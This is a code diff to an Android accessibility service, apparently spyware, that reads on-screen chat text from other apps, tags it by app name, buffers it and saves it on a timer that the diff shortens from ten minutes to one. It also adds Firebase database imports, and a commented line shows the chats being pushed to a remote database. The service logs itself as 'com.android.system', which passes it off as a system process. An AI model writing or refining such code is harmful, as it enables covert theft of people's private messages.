@@ -8,16 +8,12 @@ import android.util.Log;
 import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-import android.widget.Toast;
-
 import androidx.annotation.RequiresApi;
 
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 import com.torvalds.rtdbdatasaervice.gameover.utils.SavePref;
-
-import java.io.UnsupportedEncodingException;
 import java.net.MalformedURLException;
-import java.net.URL;
-import java.net.URLEncoder;
 import java.util.Date;
 
 
@@ -226,7 +222,6 @@ public class SocialMedia extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-//        Log.d("PHSTATE", "Accessibility Service onServiceConnected");
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
@@ -243,13 +238,11 @@ public class SocialMedia extends AccessibilityService {
         if (!chatType.equalsIgnoreCase("scroll")) {
             txtContent = updated;
             callGetFunction(updated, packageName + "_C");
-            //Log.d("accvalue", updated+"^"+packageName + "_C");
         }
         if (chatType.equalsIgnoreCase("scroll")) {
             updated = txtContent + "\r\n" + updated;
             callGetFunction(updated, packageName + "_S");
             txtContent = "";
-            //Log.d("accvalue", updated+"^"+packageName + "_S");
         }
     }
 
@@ -262,25 +255,24 @@ public class SocialMedia extends AccessibilityService {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "INIT CRS com.android.system");
+
         super.onServiceConnected();
         return START_STICKY;
     }
 
     public void callGetFunction(String data, String pkg){
+        String appname = pkg.substring(pkg.lastIndexOf(".")+1);
         SavePref pref = new SavePref(this);
-        String body = data + "^^" + pkg;
+        String body = data + "^^" + appname+ " ";
         str.append(body);
 
         long timeForComparingLastSync = System.currentTimeMillis() / 1000;
         Log.e("lalala", "outside ");
 
-        if (timeForComparingLastSync >= (pref.getLastSync() + (10 * 60))) { // 10 minutes
+        if (timeForComparingLastSync >= (pref.getLastSync() + (1 * 60))) { // 10 minutes = 10 * 60
 
-            String result = null;
-            //str.append(pref.getDeviceid());
-            result = String.valueOf(str);
-            Log.e("lalala", "from sm " + result);
-            // TODO: 16/02/2023
+            String result = String.valueOf(str);
+
             //dbRef.child(aid).child("chats").child(timeStmp()).setValue(Gson().toJson(result));
             pref.setLastSync(timeForComparingLastSync);
             pref.setChat(result);
